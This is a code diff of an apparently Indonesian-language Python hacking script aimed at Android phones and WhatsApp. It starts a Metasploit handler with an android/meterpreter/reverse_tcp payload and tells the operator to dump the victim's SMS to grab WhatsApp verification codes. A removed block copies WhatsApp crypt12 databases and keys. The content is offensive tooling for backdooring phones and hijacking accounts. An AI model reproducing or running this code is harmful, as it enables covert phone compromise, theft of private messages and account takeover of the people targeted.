@@ -134,9 +134,9 @@ def extract_wa():
 	nxt()
 	print hijau
 	flush(merah+'[!]'+hijau+' Anda akan memasuki mode meterpreter')
-	flush(merah+'[!]'+hijau+' pastikan Backdoor') 
-	flush('    dan OpenVPN telah aktif')
-	flush(merah+'[!]'+hijau+' Ambil Kode Verifikasi Target')
+	flush(merah+'[!]'+hijau+' pastikan Backdoor dan OpenVPN telah aktif')
+	print cyan
+	flush('   ###dump_sms###')
 	nxt()
 	flush(hijau+'Membuka Msfconsole ... ')
 	time.sleep(3)
@@ -161,24 +161,6 @@ def extract_wa():
 		os.system('cat y.txt')
 	f.close
 	flush('Jika link tidak Muncul, ulangi dump_sms')
-	#dstb = '/storage/emulated/0/WhatsApp/Databases/'
-	#dstd = '/storage/emulated/0/BackupTextForWhatsApp/' 
-	#flush('Sedang melakukan Backup')
-	#time.sleep(1)
-	#os.system('cp '+dstb+'*crypt12 '+dstd) 
-	#flush('Database lama telah tersimpan')
-	#os.system('cp link.txt '+dstd)
-	#time.sleep(1)
-	#flush('extract database....')
-	#time.sleep(1)
-	#os.system('mv -f msgstore.db.crypt12 '+dstb+'&&mv -f key '+dstd)
-	#time.sleep(1)
-	#flush('key tool saved in storage')
-	#time.sleep(1)
-	#flush('cleaning..')
-	#time.sleep(1)
-	#os.system('rm -rf *txt')
-	#os.system('am start --user 0 -n com.smeiti.wstotext/com.smeiti.wstotext.WStoTextActivity')
 	back()
 
 def clone():
@@ -289,7 +271,7 @@ def remote():
       remote()
     else :
       os.system("clear")
-      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit=dump_sms;sessions -k 1-10'");
+      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit;sessions -k 1-10'");
       raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
       os.system('clear')
 
